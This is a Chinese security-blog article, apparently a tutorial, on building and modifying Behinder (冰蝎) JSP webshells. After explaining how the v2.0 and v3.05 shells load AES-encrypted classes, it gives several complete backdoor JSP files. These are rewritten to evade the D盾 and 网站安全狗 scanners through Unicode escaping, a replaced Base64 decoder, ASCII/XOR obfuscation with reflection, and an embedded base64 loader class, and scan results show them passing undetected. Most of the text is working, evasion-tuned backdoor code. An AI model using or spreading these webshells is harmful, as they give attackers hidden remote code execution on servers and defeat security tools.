# 一句话木马到冰蝎webshell魔改（二）之java篇幅（上）

阅读量 **291793**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-06 10:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0189facd42f0858be9.jpg)

之前在.net篇中从一句话开始找然后逐步分析过度到冰蝎的木马，所以在java篇中我们便不在重复讲解了，直接从冰蝎v2.0版本的木马开始讲解吧！

![](https://p3.ssl.qhimg.com/t0119393ae292c59ccb.png)

* * *

环境：利用xmapp里面自带的tomcat建站

测试时，将后门文件直接存放在 `D:\xampp\tomcat\webapps\ROOT` 中，然后访问 `http:\xxx\shell.jsp`
；即可访问后门文件。

## 1.冰蝎v2.0

###  1.1.流量分析

之前在.net篇中，我们大致分析了关于冰蝎2.0中请求的流程，这里就不多赘述了，流程图如下：

![](https://p3.ssl.qhimg.com/t01f490d37b88b4d535.png)

下面我们通过流量分析验证冰蝎2.0的请求流程。  
首先是进行了get请求服务器端，然后服务器端返回了一个随机的128位密钥。

![](https://p0.ssl.qhimg.com/t012750150f0daae5e9.png)

客服端Get请求服务器端后，获取到服务器端返回的密钥，然后客户端便开始发送AES加密后的数据流。

![](https://p1.ssl.qhimg.com/t0198402acba6689faf.png)

###  1.2.原理分析

流量验证过程基本完毕，下面我们跟随作者的角度去理解一下原理吧！（具体可以参考.net魔改篇）我们以调用计算器为例。

**（1）服务器端动态解析class文件**

在前面的.net篇中，我们可以直接利用Assembly加载byte字节流动态的解析为一个class类对象，然后再用CreateInstance创建一个类的实例对象，但是在java里面并没有直接提供解析class字节数组的接口。不过classloader内部实现了一个protected的defineClass方法，可以将byte[]直接转换为Class，方法原型如下：

![](https://p0.ssl.qhimg.com/t0105eb53276670964c.png)

因为该方法是protected属性，我们没办法在外部直接调用，当然我们可以通过反射来修改保护属性，不过这里原作者选择的是一个更方便的方法—子类继承，直接自定义一个类Myloader继承classloader，然后在子类Myloader中调用父类的defineClass方法，并返回解析后的class。

代码如下：我们定义一个类Myloader继承classloader，然后在子类Myloader中定义一个方法get去调用父类的方法defineClass方法并返回解析完成的class类。

    
    
    public static class Myloader extends ClassLoader //继承ClassLoader
    {    
        public Class get(byte[] b)
        {
            return super.defineClass(b, 0, b.length);
        }        
    }
    

由于使用反射加载函数调用类方法容易被查杀，因此我们尽量使用object基类默认的方法，然后重写默认方法以实现我们需要的功能，这一点与.net篇是类似的，不过在
.net篇中我们重写的是Equals方法，而在java我们重写的是object类的toString方法。Payload02类代码如下：（这类我们实现的是一个调用计算器的方法）

    
    
    package payload01;
    
    import java.io.IOException;
    
    public class payload02 {
        @Override
        public String toString() {
            // TODO Auto-generated method stub
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            return "OK";
        }
    }
    

编译上述Payload02文件，然后将class文件读取并将二进制流进行base64编码，然后存一个byte字节数组classStr中，在Payload01中调用classStr时先对其进行base64解码
，然后调用子类Myloader的get方法实现将字节数组classStr转化为Payload02类，新建一个Payload02类的实例，然后调用重写的toString方法即可实现我们重写的功能（这里是简单的调用计算器）。代码如下：

    
    
    package payload01;
    
    import sun.misc.BASE64Decoder;
    
    public class payload01 {
        public static class Myloader extends ClassLoader //继承ClassLoader
        {    
            public Class get(byte[] b)
            {
                return super.defineClass(b, 0, b.length);
            }        
        }
        public static void main(String[] args) throws Exception {
            // TODO Auto-generated method stub
            String classStr="yv66vgAAADQAKAcAAgEAE3BheWxvYWQwMS9wYXlsb2FkMDIHAAQBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWAQAEQ29kZQoAAwAJDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTHBheWxvYWQwMS9wYXlsb2FkMDI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAEQATBwASAQARamF2YS9sYW5nL1J1bnRpbWUMABQAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsIABcBAAhjYWxjLmV4ZQoAEQAZDAAaABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAdAB8HAB4BABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAgAAYBAA9wcmludFN0YWNrVHJhY2UIACIBAAJPSwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEADnBheWxvYWQwMi5qYXZhACEAAQADAAAAAAACAAEABQAGAAEABwAAAC8AAQABAAAABSq3AAixAAAAAgAKAAAABgABAAAABQALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAcAAABpAAIAAgAAABS4ABASFrYAGFenAAhMK7YAHBIhsAABAAAACQAMAB0AAwAKAAAAEgAEAAAACgAJAAsADQANABEADwALAAAAFgACAAAAFAAMAA0AAAANAAQAIwAkAAEAJQAAAAcAAkwHAB0EAAEAJgAAAAIAJw==";
            BASE64Decoder code=new sun.misc.BASE64Decoder();
            Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数
            System.out.println(result.newInstance().toString()); //调用执行get
        }
    }
    

运行成功：

![](https://p4.ssl.qhimg.com/t01bce0508e062cbb1f.png)

在payload02类中重写的toString方法可以以string类型返回我们的执行结果，但是却无法传入一个object参数。而冰蝎在向服务端以POST的请求方式发送二进制流形式的恶意类，在服务端需要获取参数并对参数进行执行。因此
我们需要重写object基类的其他方法以便于实现我们的功能。  
如下，可以发现Equals方法可以传入一个object对象，在Java世界中，Object类是所有类的基类，所以我们可以传递任何类型的对象进去。这是与我们的要求最为契合的object基类方法。

![](https://p1.ssl.qhimg.com/t0181f5f66e0f6fc235.png)

重写的方法找到了，下面看我们要怎么把servlet的内置对象传进去呢？传谁呢？  
如下，为JSP内置的9个对象。

![](https://p5.ssl.qhimg.com/t01be1d859b1a4e1cc9.png)

但是equals方法只接受一个参数，通过对这9个对象分析发现，只要传递pageContext进去，便可以间接获取Request、Response、Seesion等对象，如HttpServletRequest
request=(HttpServletRequest) pageContext.getRequest();

另外，如果想要顺利的在equals中调用Request、Response、Seesion这几个对象，还需要考虑一个问题，那就是ClassLoader的问题。JVM是通过ClassLoader+类路径来标识一个类的唯一性的。我们通过调用自定义ClassLoader来defineClass出来的类与Request、Response、Session这些类的ClassLoader不是同一个，所以在equals中访问这些类会出现java.lang.ClassNotFoundExcep0tion异常。

解决方法就是复写ClassLoader的如下构造函数，传递一个指定的ClassLoader实例进去：

![](https://p2.ssl.qhimg.com/t017b5d32cce31f4996.png)

**（2）密钥生成**

首先检测请求方式，如果是带了密码字段的GET请求，则随机产生一个128位的密钥，并将密钥写进Session中，然后通过response发送给客户端，代码如下：

    
    
    if (request.getMethod().equalsIgnoreCase("get")) {
        String k = UUID.randomUUID().toString().replace("-","").substring(0, 16);
        request.getSession().setAttribute("uid", k);
        out.println(k);
        return;
    }
    

这样，后续发送payload的时候只需要发送加密后的二进制流，无需发送密钥，因为密钥存储在服务器的session中，因此我们可直接在服务端解密，这时候waf捕捉到的只是一堆毫无意义的二进制数据流。

**（3）解密数据，然后执行**

当客户端请求方式为POST时，服务器先从request中取出加密过的二进制数据（base64格式），代码如下：

    
    
    Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
    c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(request.getSession().getAttribute("uid").toString().getBytes(), "AES"));
    new Myloader().get(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().toString();
    

完整代码如下：

    
    
    <%@ page
        import="java.util.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%>
    <%!
    /*
    定义ClassLoader的子类Myloader
    */
    public static class Myloader extends ClassLoader {
        public Myloader(ClassLoader c) 
        {super(c);}
        public Class get(byte[] b) {  //定义get方法用来将指定的byte[]传给父类的defineClass
            return super.defineClass(b, 0, b.length);
        }
    }
    %>
    <%
        if (request.getParameter("pass")!=null) {  //判断请求方法是不是带密码的握手请求，此处只用参数名作为密码，参数值可以任意指定
            String k = UUID.randomUUID().toString().replace("-", "").substring(0, 16);  //随机生成一个16字节的密钥
            request.getSession().setAttribute("uid", k); //将密钥写入当前会话的Session中
            out.print(k); //将密钥发送给客户端
            return; //执行流返回，握手请求时，只产生密钥，后续的代码不再执行
        }
        /*
        当请求为非握手请求时，执行下面的分支，准备解密数据并执行
        */
        String uploadString= request.getReader().readLine();//从request中取出客户端传过来的加密payload
        Byte[] encryptedData= new sun.misc.BASE64Decoder().decodeBuffer(uploadString); //把payload进行base64解码
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding"); // 选择AES解密套件
        c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(request.getSession().getAttribute("uid").toString().getBytes(), "AES")); //从Session中取出密钥
        Byte[] classData= c.doFinal(encryptedData);  //AES解密操作
        Object myLoader= new Myloader().get(classData).newInstance(); //通过ClassLoader的子类Myloader的get方法来间接调用defineClass方法，将客户端发来的二进制class字节数组解析成Class并实例化
        String result= myLoader.equals(pageContext); //调用payload class的equals方法，我们在准备payload class的时候，将想要执行的目标代码封装到equals方法中即可，将执行结果通过equals中利用response对象返回。
    %>
    

## 2.冰蝎v3.05魔改

###  2.1.原理简述

上面我们已经对冰蝎2.0的木马原理进行了一个详细的描述，冰蝎v3.05与v2.0相差不大，我们就不多赘述了，大致把原理讲一遍即可，详情请看上面哦！

如下，可以发现，v3.0并不像2.0一样需要向服务器请求payload，而是可以直接向服务器发送加密后的数据流，这是因客户端和服务器端在连接的时候就已经协商好了密钥，因此在连接的时候直接发送密钥加密好的数据流即可，服务端获取数据流后，从session中取出密钥，然后即可解密读取数据流的内容。

完整代码如下：

    
    
    <%@page
        import="java.util.*,javax.crypto.*,javax.crypto.spec.*"
    %>
    <%
    !class U extends ClassLoader{U(ClassLoader c){super(c);}
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
            }
    }
    %>
    <%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默
        认连接密码rebeyond*/
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
    %>
    

**流量简单分析如下：**  
客户端直接以post的方式向服务器端发送AES加密后的数据流即可，去掉了冰蝎2.0的密钥协商过程。

![](https://p4.ssl.qhimg.com/t01dcf5a34c238e68b6.png)

![](https://p4.ssl.qhimg.com/t012bedc2bbffd026b4.png)

###  2.2.基本变换—逃避静态特征码

**（1）长句变短**

换行拆分基本没变换，因此就不搞过来了，下面是长句变短之后代码。（还是挺长的，注释的是之前变短的语句，但是一直报byte和Byte无法转换的错误，所以就放弃了。）
shell01.jsp

    
    
    <%@page
        import="java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.BASE64Decoder"
    %>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
            }
    }
    %>
    <%
        if (request.getMethod().equals("POST")){
            String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            session.putValue("u",k);
    
            String uploadString= request.getReader().readLine();//从request中取出客户端传过来的加密payload
            Cipher c=Cipher.getInstance("AES"); //选择AES解密套件
            c.init(2,new SecretKeySpec(k.getBytes(),"AES")); //赋值AES的密钥
    
    //        String uploadString= request.getReader().readLine();
    //        BASE64Decoder code=new sun.misc.BASE64Decoder();
    //        byte[] encryptedData= new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()); //payload进行base64解码
    //        Byte[] classData= c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));  //AES解密操作
    
            Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance(); //通过ClassLoader的子类U的g方法来间接调用defineClass方法，将客户端发来的二进制class字节数组解析成Class并实例化
            myLoader.equals(pageContext);//将pageContext传入重写的Equals方法中
    
        }
    
    %>
    

![](https://p5.ssl.qhimg.com/t017fac85b665d698b2.png)

分段之后，逐句验证特征码的时候发现网站安全狗的特征码在于AES解密操作，即函数doFinal。而D盾的特征码在于base64解密操作，即BASE64Decoder。因此我们之后的思路就是想办法取出这两个函数从而达到免杀的目的。  
（PS：顺带发现，如果不加<%%>的话，D盾和安全狗特征码啥的似乎就检测不出来了，也就是说他会先检测文件类型是否符合，再检测特征码是否正确！）

**（2）替换特征函数**

在上面我们讲到D盾的特征码为BASE64Decoder，因此我们可以尝试替换加密函数进行绕过，替换有两种形式，一是java自带的库进行替换，还一种就是自己写，保险，但是有点麻烦，有些自己加密算法与库里面自带的还不一样，因此自定义的时候可以通过加解密前后的异或运算验证一下与库自带的结果是否相同。  
查阅资料发现，除了JDK中的sun.misc套件中base64加解密函数外，的在JDK8及更高版本中的还存在其他的base64加解密函数，即
java.util.Base64，因此我们可以尝试进行替换。

代码如下：shell02.jsp

    
    
    <%@page
        import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.util.Base64.*"
    %>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
            }
    }
    %>
    <%
        if (request.getMethod().equals("POST")){
            String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            session.putValue("u",k);
    
            String uploadString= request.getReader().readLine();//从request中取出客户端传过来的加密payload
            Cipher c=Cipher.getInstance("AES"); //选择AES解密套件
            c.init(2,new SecretKeySpec(k.getBytes(),"AES")); //赋值AES的密钥
            Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(uploadString))).newInstance(); 
            myLoader.equals(pageContext);//将pageContext传入重写的Equals方法中
        }
    
    %>
    

替换base64函数后，D盾就绕过了，但是可以发现网站安全狗还是会报错的，因为他的关键词doFinal并没有被过滤掉。这个函数目前不是很熟悉，如果有熟悉的大佬请ddddhm！

![](https://p2.ssl.qhimg.com/t01577a11f3e94fb95a.png)

**（3）Unicode编码绕过**

思路来自于：  
<https://www.anquanke.com/post/id/206664>

**需要注意的是，双引号包含的参数等内容以导入的库以及一些字符不要进行编码，否则会导致程序报错。**

原文件如下：

    
    
    <%@page
        import="java.util.*,javax.crypto.*,javax.crypto.spec.*"
    %>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
            }
    }
    %>
    <%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
    %>
    

import库的那个句话无需修改，而是后面的进行修改，unicode后的编码如下：处于兴趣自己写了一个unicode的程序，放在附录，需要的表哥自取哦！shell03.jsp

    
    
    <%@page    import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!\u0063\u006c\u0061\u0073\u0073 \u0055 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0055(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u0063){\u0073\u0075\u0070\u0065\u0072(\u0063);}    \u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0067(\u0062\u0079\u0074\u0065 []\u0062){        \u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0062,\u0030,\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);        }}%><%\u0069\u0066 (\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064().\u0065\u0071\u0075\u0061\u006c\u0073("POST")){    \u0053\u0074\u0072\u0069\u006e\u0067 \u006b="e45e329feb5d925b";/*\u008be5\u005bc6\u0094a5\u004e3a\u008fde\u0063a5\u005bc6\u007801\u0033\u0032\u004f4d\u006d\u0064\u0035\u00503c\u007684\u00524d\u0031\u0036\u004f4d，\u009ed8\u008ba4\u008fde\u0063a5\u005bc6\u007801\u0072\u0065\u0062\u0065\u0079\u006f\u006e\u0064*/    \u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065("u",\u006b);    \u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("AES");    \u0063.\u0069\u006e\u0069\u0074(\u0032,\u006e\u0065\u0077 \u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u006b.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"AES"));    \u006e\u0065\u0077 \u0055(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0067(\u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u006e\u0065\u0077 \u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0052\u0065\u0061\u0064\u0065\u0072().\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065()))).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065().\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);}%>
    

类比，还记得我们在上面说到D盾和服务器安全狗的关键词吗？对于D盾的base64函数我们利用同等函数替换获得了免杀马，在本次方法中我们发现unicode编码后的木马可以直接被执行，因此我们可以尝试利用
**unicode对敏感词进行编码替换** 。替换后的代码如下，D盾和网站安全狗完全免杀。shell05.jsp

    
    
    <%@page
        import="java.util.*,javax.crypto.*,javax.crypto.spec.*"
    %>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
            }
    }
    %>
    <%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        new U(this.getClass().getClassLoader()).g(c.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(new sun.misc.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
    %>
    

免杀结果如下：

![](https://p1.ssl.qhimg.com/t016d1ee8e3dc885a03.png)

**（4）ASCII编码=反射加载绕过**

上面我们知道D盾的免杀为BASE64Decoder函数，因此我们可以利用ASCII编码将函数BASE64Decoder进行替换。与unicode的方法类似，我们将敏感函数BASE64Decoder进行ASCII编码，但是jsp并不能直接执行acsII解码后的字符串，因此我们这里我们选用类反射加载的方式执行BASE64Decoder函数。  
首先我们对 `sun.misc.BASE64Decoder` 库进行ASCII编码，创建一个 `sun.misc.BASE64Decoder`
类，通过类我们实例化一个对象并获取他的“类库自带的”BASE64Decoder方法对我们从网页读取到的内容进行解密。具体如下：

    
    
    String uploadString= request.getReader().readLine(); //网页读取的内容
    
    /*将sun.misc.BASE64Decoder转换成ASCII码*/
    int[] aa=new int[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,68,101,99,111,100,101,114}; //sun.misc.BASE64Decoder编码为ASCII的内容
    String ccstr="";
    for (int i = 0;i<aa.length;i++){
        ccstr=ccstr+(char)aa[i];
    }
    
    Class clazz = Class.forName(ccstr); //获取到 Class 对象,即sun.misc.BASE64Decoder类库
    byte[] ss= (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), uploadString);  //实例化sun.misc.BASE64Decoder类对象，并且获取该类的decodeBuffer方法，对网页获取到的内容进行解密
    
    Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(ss)).newInstance();
    myLoader.equals(pageContext);
    

具体的冰蝎代码如下：shell09.jsp

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
    public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
    <%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u",k);
    
        String uploadString= request.getReader().readLine();
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    
        /*将sun.misc.BASE64Decoder转换成ASCII码*/
        int[] aa=new int[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,68,101,99,111,100,101,114};
        String ccstr="";
        for (int i = 0;i<aa.length;i++)
        {
            ccstr=ccstr+(char)aa[i];
        }
        Class clazz = Class.forName(ccstr); //获取到 Class 对象,即sun.misc.BASE64Decoder
        byte[] ss= (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), uploadString); 
    
        Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(ss)).newInstance();
        myLoader.equals(pageContext);
    }
    %>
    

扫描结果如下：

![](https://p4.ssl.qhimg.com/t01f0eef756003dc131.png)

**拓展分享：（分享一个小技巧）**

上面我们是直接把sun.misc.BASE64Decoder的进行ASCII编码了，但是实际上如果这些ASCII编码总是一成不变的话就容易被加入特征库，因此我们可以对它添加一些其他的小运算，最简单的就是异或运算了代码如下，其实除了异或运算的话还可以自行添加一些其他的加解密算法。shell08.jsp

    
    
    /*将sun.misc.BASE64Decoder转换成ASCII码^0X10后的ASCII码*/
    int[] aa=new int[]{99,101,126,62,125,121,99,115,62,82,81,67,85,38,36,84,117,115,127,116,117,98};
    String ccstr="";
    for (int i = 0;i<aa.length;i++){
        aa[i]=aa[i]^0x010;
        ccstr=ccstr+(char)aa[i];
    }
    Class clazz = Class.forName(ccstr); //获取到 Class 对象,即sun.misc.BASE64Decoder
    

###  2.3.基于重写的dll加载

**（1）整个过程写入dll—重写Equals方法（dll直接放入）**

本思路的主要过程就是将冰蝎的加解密执行过程放入到dll中，但是加解密的内容，即客户端传递的加payload怎么传递给dll中呢？作为参数传入。  
那么问题来了，作为什么方法的参数不容易被发现呢？基类object自带方法的参数啦，这里我们类似于.net篇，重写equals方法，然后将参数作为equals方法的参数传递给dll。代码如下，我们先将需要传递的参数赋值给一个赋值给一个ArrayList<Object>类型（个人理解为存放对象的数组集合，因为我们需要处传入的参数，即页面上设置的k、客户端传过来的加密payload即p、页面指针pageContext类型均为object类型，所以在此定义一个ArrayList<Object>类型容器存放传入的参数。）

    
    
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    String p=request.getReader().readLine();
    ArrayList<Object> t=new ArrayList<Object>();
    t.add(k);
    t.add(p);
    t.add(pageContext);
    t.add(this.getClass().getClassLoader());
    

由于我们需要解密执行客户端传过来的加密payload即p，他也是一串加密了的byte[]，就算解密了也是属于byte[]，因此我们想要执行的话还是需要将其转换为class解密执行。

又回到了我们最开始讨论的问题，即怎么将byte[]转换为class呢？defineClass方法！但是由于该方法是属于classloader类内部的protected属性，因此我们需要先设计一个子类bx继承classloader类，然后在定义一个方法get获取classloader父类的defineClass方法。代码如下：

    
    
    import java.util.*;
    import javax.crypto.*;
    import javax.crypto.spec.*;
    
    public class bx extends ClassLoader
    {
     public    bx(ClassLoader c){super(c);}
     public    bx(){super();}
    public Class g(byte []b){
        return super.defineClass(b,0,b.length);}
    @Override
    public boolean equals(Object obj) {
        try
        {    
        ArrayList<Object> tt=(ArrayList<Object>)obj;
        String k=(String)tt.get(0);//密钥
        String p=(String)tt.get(1);//base64格式密文
    //    Object pageContext=tt.get(2);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        byte[] x=new sun.misc.BASE64Decoder().decodeBuffer(p);//二进制密文
        new bx((ClassLoader)tt.get(3)).g(c.doFinal(x)).newInstance().equals(tt.get(2));
        } catch(Exception e) {
            return false;
            }
            return true;    
        }
    }
    

编译为class并转为base64编码的格式，然后在jsp中加载它。代码如下，shell06.jsp

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
    public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
    <%if (request.getMethod().equals("POST")){
    String bx="yv66vgAAADQAUQoAEQAlCgARACYKABEAJwcAKAoABAApBwAqCAArCgAsAC0HAC4KAAYALwoACQAwCgAsADEHADIKAA0AJgoADQAzBwA0BwA1CgAQACUKACwANgoAEAA3CgA4ADkKADoAOwcAPAEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAAygpVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAA1TdGFja01hcFRhYmxlBwA8AQAKU291cmNlRmlsZQEAB2J4LmphdmEMABgAGQwAGAAcDAA9AD4BABNqYXZhL3V0aWwvQXJyYXlMaXN0DAA/AEABABBqYXZhL2xhbmcvU3RyaW5nAQADQUVTBwBBDABCAEMBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDABEAEUMABgARgwARwBIAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwASQBKAQACYngBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAEsATAwAHQAeBwBNDABOAE8HAFAMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQADZ2V0AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAPamF2YS9sYW5nL0NsYXNzAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9PYmplY3QAIQAQABEAAAAAAAQAAQAYABkAAQAaAAAAHgACAAIAAAAGKiu3AAGxAAAAAQAbAAAABgABAAAABgABABgAHAABABoAAAAdAAEAAQAAAAUqtwACsQAAAAEAGwAAAAYAAQAAAAcAAQAdAB4AAQAaAAAAIQAEAAIAAAAJKisDK763AAOwAAAAAQAbAAAABgABAAAACQABAB8AIAABABoAAADEAAYABwAAAG0rwAAETSwDtgAFwAAGTiwEtgAFwAAGOgQSB7gACDoFGQUFuwAJWS22AAoSB7cAC7YADLsADVm3AA4ZBLYADzoGuwAQWSwGtgAFwAARtwASGQUZBrYAE7YAFLYAFSwFtgAFtgAWV6cABk0DrASsAAEAAABlAGgAFwACABsAAAAuAAsAAAAPAAUAEAAOABEAGAATAB8AFAAyABUAQAAWAGUAHABoABkAaQAbAGsAHQAhAAAACQAC9wBoBwAiAgABACMAAAACACQ=";
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    String p=request.getReader().readLine();
    ArrayList<Object> t=new ArrayList<Object>();
    t.add(k);
    t.add(p);
    t.add(pageContext);
    t.add(this.getClass().getClassLoader());
    new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(bx)).newInstance().equals(t);}%>
    

运行结果：  
（如下可以发现D盾还是会爆可疑文件，这个其实从上面可以发现，爆出可疑文件主要是因为加密函数BASE64Decoder的问题，我们把整个函数进行替换即可绕过，这里只是提供一种绕过的思路啦！）

![](https://p1.ssl.qhimg.com/t01ad29c81ab31accb8.png)

我们按照上面的编码把base64加密函数进行编码则可以绕过D盾。shell07.jsp

    
    
    new U(this.getClass().getClassLoader()).g(new sun.misc.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer(bx)).newInstance().equals(t);
    

![](https://p4.ssl.qhimg.com/t010307c6f94d902227.png)

